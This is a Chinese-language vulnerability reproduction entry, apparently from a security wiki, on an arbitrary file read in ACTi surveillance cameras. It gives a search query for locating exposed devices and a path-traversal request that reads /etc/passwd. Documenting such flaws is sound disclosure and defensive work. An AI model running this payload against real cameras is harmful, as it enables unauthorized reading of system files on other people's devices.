---
title: "ACTI 视频监控 images 任意文件读取漏洞"
date: 2026-10-18 09:13:55
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "ACTI-视频监控"
tags:
  - "ACTI-视频监控"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

ACTI 视频监控 存在任意文件读取漏洞

## 漏洞影响

```
ACTI摄像头
```

## 网络测绘

```
app="ACTi-视频监控"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202140926386.png)

使用Burp抓包

```plain
/images/../../../../../../../../etc/passwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202140926873.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/ACTI-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
